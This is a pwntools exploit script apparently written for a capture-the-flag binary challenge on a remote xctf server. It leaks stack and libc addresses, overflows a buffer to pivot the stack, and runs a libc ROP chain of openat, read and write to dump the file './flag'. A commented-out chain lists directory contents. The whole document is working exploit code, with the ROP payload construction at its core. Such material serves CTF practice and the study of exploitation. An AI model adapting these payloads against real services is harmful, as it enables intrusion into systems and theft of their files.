#!/usr/bin/env python3
from pwn import *

exe = ELF("./pwn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

HOST="pwn-42c1acba80.challenge.xctf.org.cn"
PORT=9999

context.binary = exe
context.log_level = 'debug'

gdbscript="""
b*0x0000000000401338
b*0x00000000004013B1
b*0x4013eb
"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote(HOST, PORT, ssl=True)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)
rl = lambda: p.recvline().strip()
rn = lambda n: p.recvn(n)

rbp = 0x000000000040121d
main = 0x0000000000401413
sa(b"name?\n", b"A"*16)
ru(b"A"*16)
stack = u64(p.recvn(6).ljust(8, b"\x00"))
success("stack " + hex(stack))
sa(b"else?\n", b"B"*96 + p64(stack) + p64(0x401354) + p64(0) + b'\x76')

sa(b"name?\n", b"A"*24)
ru(b"A"*24)
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 171382
success(f'libc base: {hex(libc.address)}')
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc.address + 0x00000000000904a9
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
ret = pop_rdi + 1

openat = libc.symbols['openat']
getdents64 = libc.symbols['getdents64'] 
write = libc.symbols['write']
read_plt = exe.plt['read']
sendfile = libc.symbols['sendfile']

bss = 0x404100
path = bss
buff = bss + 0x100
buf_sz = 0x100
AT_FDCWD = -100 
O_DIRECTORY = 0x10000
O_RDONLY = 0

# listfile = flat(
#     pop_rdi, 0,
#     pop_rsi, path,
#     pop_rdx_rbx, 0x100, 0,
#     read_plt,

#     # 2) fd = openat(AT_FDCWD, PATH, O_DIRECTORY, 0)
#     pop_rdi, AT_FDCWD,
#     pop_rsi, path,
#     pop_rdx_rbx, O_DIRECTORY, 0,
#     openat,

#     # 3) getdents64(fd=3, BUF, BUFSZ)
#     pop_rdi, 3,
#     pop_rsi, buff,
#     pop_rdx_rbx, buf_sz, 0,
#     getdents64,

#     # 4) write(1, BUF, BUFSZ)
#     pop_rdi, 1,
#     pop_rsi, buff,
#     pop_rdx_rbx, buf_sz, 0,
#     write,
# )

# sa(b"name?\n", b"A"*16)
# payload = b"B"*96 + b"C"*8 + listfile
# sa(b"else?\n", payload)

# pause()
# s(b"/\x00")

orw = flat(
    pop_rdi, 0,
    pop_rsi, path,
    pop_rdx_rbx, 0x100, 0,
    read_plt,

    # 2)
    pop_rdi, AT_FDCWD,
    pop_rsi, path,
    pop_rdx_rbx, 0, 0,
    openat,

    # 3) 
    pop_rdi, 3,
    pop_rsi, buff,
    pop_rdx_rbx, buf_sz, 0,
    read_plt,

    # 4) write(1, BUF, BUFSZ) 
    pop_rdi, 1,
    pop_rsi, buff,
    pop_rdx_rbx, buf_sz, 0,
    write,
)

sa(b"name?\n", b"A"*16)
payload = b"B"*96 + b"C"*8 + orw
sa(b"else?\n", payload)

pause()
s(b"./flag\x00")
p.interactive()